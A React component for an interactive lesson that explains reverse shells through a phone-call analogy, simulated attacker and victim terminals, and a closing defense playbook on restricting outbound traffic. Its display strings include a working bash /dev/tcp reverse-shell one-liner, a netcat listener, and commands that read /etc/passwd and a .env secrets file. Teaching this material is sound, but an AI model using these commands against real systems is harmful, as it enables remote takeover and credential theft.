import { useState, useCallback } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import LessonLayout from '../components/LessonLayout'
import StepExplainer from '../components/StepExplainer'
import './ShellLesson.css'

const steps = [
    {
        title: 'What is a shell?',
        description:
            'A shell is like a remote control for a computer. Imagine you could type instructions on someone else\'s computer from your couch — that\'s a shell. Whoever has it controls the machine.',
    },
    {
        title: 'The phone call trick',
        description:
            'The building has security guards (firewall) that block all incoming phone calls. But people inside can call OUT freely — they need to browse the web! The attacker exploits this: instead of calling IN, they trick the server into calling THEM.',
    },
    {
        title: 'Setting the trap',
        description:
            'The attacker picks up the phone and waits ("Start listening"). Then they plant a tiny program on the victim server that says: "Call this number." The server obeys and calls the attacker.',
    },
    {
        title: 'The line is open!',
        description:
            'Once the server calls the attacker, the connection is established. Now the attacker can whisper commands through the phone line and hear everything back — it\'s like having a remote control inside the building.',
    },
    {
        title: 'Full remote control',
        description:
            'The attacker types commands on their own machine, but those commands run on the server. They can read files, steal passwords, install malware — all through that one phone call.',
    },
    {
        title: 'How to stop this',
        description:
            'Block unnecessary outgoing calls! Only allow the server to contact specific trusted addresses. Use security software (EDR) that spots when a web server tries to open a shell. Monitor for suspicious repeated calls (beaconing).',
    },
]

/* Plain-language explainer text for each phase — the "What's happening?" box */
const phaseExplainers = {
    intro: {
        icon: '📖',
        title: 'How it works',
        text: 'Normally, the attacker would try to connect TO the victim (like knocking on the door). But the firewall blocks that. So instead, the attacker tricks the victim into connecting to THEM — like leaving a phone inside that calls out.',
    },
    listener: {
        icon: '📞',
        title: 'Attacker picks up the phone',
        text: 'The attacker\'s computer is now "listening" — it\'s waiting for the victim to call. Think of it as holding a phone to your ear and waiting for it to ring.',
    },
    payload: {
        icon: '💣',
        title: 'The trap is ready',
        text: 'Now the attacker needs to get the victim server to make a call. They deliver a tiny program (the payload) through a vulnerability — like slipping a note under the door that says "Call this number."',
    },
    connecting: {
        icon: '⏳',
        title: 'Calling out...',
        text: 'The victim server is dialing the attacker\'s number! The security guards (firewall) let it through because outgoing calls are allowed. This is the key trick!',
    },
    connected: {
        icon: '🔗',
        title: 'Line is open!',
        text: 'The call connected. The attacker now has a direct line into the server. Every command they type runs on the victim\'s machine — like whispering instructions through the phone.',
    },
    commands: {
        icon: '⌨️',
        title: 'Remote control active',
        text: 'The attacker is typing commands on their keyboard, but those commands execute on the victim server. They\'re stealing files and passwords through the open phone line.',
    },
    defense: {
        icon: '🛡️',
        title: 'How we stop this',
        text: 'By restricting outgoing connections, the "phone call" never gets through. The server tries to dial out, but the guards say NO. The attack fails!',
    },
}

export default function ShellLesson() {
    const [phase, setPhase] = useState('intro')
    const [currentStep, setCurrentStep] = useState(0)
    const [attackerLines, setAttackerLines] = useState([])
    const [victimLines, setVictimLines] = useState([])
    const [connectionActive, setConnectionActive] = useState(false)
    const [cmdIndex, setCmdIndex] = useState(0)

    const addAttackerLine = useCallback((text, type = 'info') => {
        setAttackerLines((prev) => [...prev, { text, type }])
    }, [])

    const addVictimLine = useCallback((text, type = 'info') => {
        setVictimLines((prev) => [...prev, { text, type }])
    }, [])

    const startListener = () => {
        setPhase('listener')
        setCurrentStep(2)
        setAttackerLines([
            { text: '# Attacker machine (192.168.1.50)', type: 'header' },
            { text: '$ nc -lvnp 4444', type: 'command' },
            { text: 'listening on [any] 4444 ...', type: 'info' },
        ])
        setVictimLines([
            { text: '# Victim server (10.0.0.25)', type: 'header' },
            { text: '$ _', type: 'info' },
        ])

        setTimeout(() => setPhase('payload'), 2000)
    }

    const deliverPayload = () => {
        setCurrentStep(3)
        setVictimLines([
            { text: '# Victim server (10.0.0.25)', type: 'header' },
            { text: '# Malicious payload activated!', type: 'stolen' },
            { text: '$ bash -i >& /dev/tcp/192.168.1.50/4444 0>&1', type: 'command' },
        ])

        setTimeout(() => {
            setPhase('connecting')
            addVictimLine('Connecting to 192.168.1.50:4444...', 'info')
        }, 1500)

        setTimeout(() => {
            setConnectionActive(true)
            setPhase('connected')
            setCurrentStep(3)
            addAttackerLine('', 'info')
            addAttackerLine('connect to [192.168.1.50] from 10.0.0.25', 'highlight')
            addAttackerLine('bash-5.2$ _', 'highlight')
            addAttackerLine('', 'info')
            addAttackerLine('🎯 Reverse shell established!', 'highlight')
            addVictimLine('Connected!', 'open')
        }, 3500)
    }

    const remoteCommands = [
        { cmd: 'whoami', output: 'www-data', explain: '→ Checking: "Who am I on this computer?"' },
        { cmd: 'cat /etc/passwd | head -3', output: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin\nbin:x:2:2:bin:/usr/bin', explain: '→ Reading the list of all users on the system' },
        { cmd: 'ls /var/www/html/', output: 'index.php  config.php  uploads/  .env', explain: '→ Looking at what files the website has' },
        { cmd: 'cat .env', output: 'DB_PASS=SuperSecret123!\nAPI_KEY=sk-live-abc123xyz', explain: '→ 🚨 Found the secret passwords!' },
    ]

    const runNextCommand = () => {
        if (cmdIndex >= remoteCommands.length) return
        setCurrentStep(4)
        setPhase('commands')
        const cmd = remoteCommands[cmdIndex]
        addAttackerLine(cmd.explain, 'info')
        addAttackerLine(`bash-5.2$ ${cmd.cmd}`, 'command')

        setTimeout(() => {
            cmd.output.split('\n').forEach((line) => {
                addAttackerLine(line, cmdIndex === 3 ? 'stolen' : 'open')
            })
            addAttackerLine('', 'info')
            setCmdIndex((prev) => prev + 1)
        }, 800)
    }

    const showDefense = () => {
        setPhase('defense')
        setCurrentStep(5)
        setConnectionActive(false)
        setAttackerLines([
            { text: '🛡️  DEFENSE PLAYBOOK', type: 'highlight' },
            { text: '', type: 'info' },
            { text: '✅ Only allow servers to contact trusted addresses', type: 'open' },
            { text: '✅ Detect when a web server opens a terminal (shell)', type: 'open' },
            { text: '✅ Watch for repeating outbound "phone calls" (beaconing)', type: 'open' },
            { text: '✅ Never run web apps with full admin rights', type: 'open' },
            { text: '✅ Use containers to limit what a hacked app can reach', type: 'open' },
        ])
        setVictimLines([
            { text: '# Victim server (hardened)', type: 'header' },
            { text: '$ bash -i >& /dev/tcp/... 0>&1', type: 'command' },
            { text: '❌ Connection refused — outbound blocked!', type: 'blocked' },
            { text: '⚠️  Alert sent to security team', type: 'blocked' },
        ])
    }

    const reset = () => {
        setPhase('intro')
        setCurrentStep(0)
        setAttackerLines([])
        setVictimLines([])
        setConnectionActive(false)
        setCmdIndex(0)
    }

    const explainer = phaseExplainers[phase]

    const sidebar = <StepExplainer steps={steps} currentStep={currentStep} />

    return (
        <LessonLayout
            title="Reverse Shell"
            subtitle="The phone call from inside the building"
            sidebar={sidebar}
        >
            <div className="sh-scene">
                {/* "What's happening?" explainer */}
                <AnimatePresence mode="wait">
                    <motion.div
                        key={phase}
                        className="sh-explainer"
                        initial={{ opacity: 0, y: -10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: 10 }}
                        transition={{ duration: 0.3 }}
                    >
                        <span className="sh-explainer-icon">{explainer.icon}</span>
                        <div className="sh-explainer-content">
                            <div className="sh-explainer-title">{explainer.title}</div>
                            <div className="sh-explainer-text">{explainer.text}</div>
                        </div>
                    </motion.div>
                </AnimatePresence>

                {/* Phone analogy intro */}
                {phase === 'intro' && (
                    <motion.div
                        className="sh-analogy"
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                    >
                        <div className="sh-analogy-row">
                            <div className="sh-analogy-side">
                                <div className="sh-analogy-emoji">🕵️</div>
                                <div className="sh-analogy-label">Hacker</div>
                            </div>
                            <div className="sh-analogy-vs">
                                <div className="sh-analogy-attempt sh-analogy-blocked">
                                    <span>❌ Incoming call blocked</span>
                                    <span className="sh-analogy-arrow">→ 🧱 →</span>
                                </div>
                                <div className="sh-analogy-attempt sh-analogy-success">
                                    <span>✅ Outgoing call allowed!</span>
                                    <span className="sh-analogy-arrow">← 📞 ←</span>
                                </div>
                            </div>
                            <div className="sh-analogy-side">
                                <div className="sh-analogy-emoji">🖥️</div>
                                <div className="sh-analogy-label">Server</div>
                            </div>
                        </div>
                        <div className="sh-analogy-caption">
                            The firewall blocks incoming connections, but <strong>outgoing connections pass right through</strong>
                        </div>
                    </motion.div>
                )}

                {/* Split view: Attacker ←→ Victim (only after intro) */}
                {phase !== 'intro' && (
                    <div className="sh-network">
                        {/* Attacker Side */}
                        <div className="sh-machine sh-attacker">
                            <div className="sh-machine-header">
                                <span>🕵️ Hacker's Computer</span>
                                <span className="sh-machine-ip">192.168.1.50</span>
                            </div>
                            <div className="sh-terminal-mini">
                                {attackerLines.map((line, i) => (
                                    <motion.div
                                        key={`a-${i}-${line.text}`}
                                        initial={{ opacity: 0, x: -6 }}
                                        animate={{ opacity: 1, x: 0 }}
                                        className={`sh-line sh-line-${line.type}`}
                                    >
                                        {line.text}
                                    </motion.div>
                                ))}
                                {(phase === 'listener' || phase === 'payload') && (
                                    <span className="sh-cursor">▌</span>
                                )}
                            </div>
                        </div>

                        {/* Connection line */}
                        <div className="sh-connection">
                            <AnimatePresence>
                                {connectionActive && (
                                    <motion.div
                                        className="sh-conn-line"
                                        initial={{ scaleX: 0 }}
                                        animate={{ scaleX: 1 }}
                                        exit={{ scaleX: 0 }}
                                        transition={{ duration: 0.8 }}
                                    >
                                        <div className="sh-conn-pulse" />
                                    </motion.div>
                                )}
                            </AnimatePresence>
                            <div className="sh-conn-label">
                                {connectionActive
                                    ? '🔴 Phone line ACTIVE'
                                    : phase === 'connecting'
                                        ? '⏳ Dialing...'
                                        : phase === 'defense'
                                            ? '❌ Call blocked!'
                                            : '🔇 No connection'}
                            </div>
                            {connectionActive && (
                                <motion.div
                                    className="sh-conn-arrow"
                                    initial={{ opacity: 0 }}
                                    animate={{ opacity: 1 }}
                                >
                                    ← Server calls hacker
                                </motion.div>
                            )}
                        </div>

                        {/* Victim Side */}
                        <div className="sh-machine sh-victim">
                            <div className="sh-machine-header">
                                <span>🖥️ Victim Server</span>
                                <span className="sh-machine-ip">10.0.0.25</span>
                            </div>
                            <div className="sh-terminal-mini">
                                {victimLines.map((line, i) => (
                                    <motion.div
                                        key={`v-${i}-${line.text}`}
                                        initial={{ opacity: 0, x: 6 }}
                                        animate={{ opacity: 1, x: 0 }}
                                        className={`sh-line sh-line-${line.type}`}
                                    >
                                        {line.text}
                                    </motion.div>
                                ))}
                            </div>
                        </div>
                    </div>
                )}

                {/* Firewall visual */}
                <div className={`sh-firewall ${phase === 'defense' ? 'sh-firewall-active' : ''}`}>
                    <span className="sh-fw-icon">{phase === 'defense' ? '🛡️' : '🧱'}</span>
                    <span className="sh-fw-label">
                        Firewall — {phase === 'defense'
                            ? 'Outgoing calls restricted ✅'
                            : connectionActive
                                ? 'Outgoing calls allowed ⚠️'
                                : 'Incoming blocked, outgoing allowed'}
                    </span>
                </div>

                {/* Controls */}
                <div className="sh-controls">
                    <AnimatePresence mode="wait">
                        {phase === 'intro' && (
                            <motion.button
                                key="start"
                                className="sh-btn sh-btn-primary"
                                onClick={startListener}
                                whileHover={{ scale: 1.05 }}
                                whileTap={{ scale: 0.95 }}
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                exit={{ opacity: 0 }}
                            >
                                📞 Pick up the phone (start listening)
                            </motion.button>
                        )}

                        {phase === 'payload' && (
                            <motion.button
                                key="payload"
                                className="sh-btn sh-btn-danger"
                                onClick={deliverPayload}
                                whileHover={{ scale: 1.05 }}
                                whileTap={{ scale: 0.95 }}
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                exit={{ opacity: 0 }}
                            >
                                💣 Slip the note under the door ("Call this number!")
                            </motion.button>
                        )}

                        {phase === 'connecting' && (
                            <motion.div
                                key="connecting"
                                className="sh-connecting"
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                exit={{ opacity: 0 }}
                            >
                                <span className="sh-pulse" /> The server is dialing out...
                            </motion.div>
                        )}

                        {phase === 'connected' && (
                            <motion.button
                                key="runcmd"
                                className="sh-btn sh-btn-danger"
                                onClick={runNextCommand}
                                whileHover={{ scale: 1.05 }}
                                whileTap={{ scale: 0.95 }}
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                exit={{ opacity: 0 }}
                            >
                                🎙️ Whisper a command: {remoteCommands[cmdIndex]?.cmd || 'done'}
                            </motion.button>
                        )}

                        {phase === 'commands' && cmdIndex < remoteCommands.length && (
                            <motion.button
                                key={`cmd-${cmdIndex}`}
                                className="sh-btn sh-btn-danger"
                                onClick={runNextCommand}
                                whileHover={{ scale: 1.05 }}
                                whileTap={{ scale: 0.95 }}
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                exit={{ opacity: 0 }}
                            >
                                🎙️ Whisper: {remoteCommands[cmdIndex]?.cmd}
                            </motion.button>
                        )}

                        {((phase === 'commands' && cmdIndex >= remoteCommands.length)) && (
                            <motion.div
                                key="postcommands"
                                className="sh-btn-group"
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                exit={{ opacity: 0 }}
                            >
                                <div className="sh-pwned-msg">
                                    💀 Server fully compromised — all through one phone call!
                                </div>
                                <motion.button
                                    className="sh-btn sh-btn-safe"
                                    onClick={showDefense}
                                    whileHover={{ scale: 1.05 }}
                                    whileTap={{ scale: 0.95 }}
                                >
                                    🛡️ How do we stop this?
                                </motion.button>
                            </motion.div>
                        )}

                        {phase === 'defense' && (
                            <motion.button
                                key="reset"
                                className="sh-btn sh-btn-secondary"
                                onClick={reset}
                                whileHover={{ scale: 1.05 }}
                                whileTap={{ scale: 0.95 }}
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                exit={{ opacity: 0 }}
                            >
                                ↻ Start Over
                            </motion.button>
                        )}
                    </AnimatePresence>
                </div>
            </div>
        </LessonLayout>
    )
}
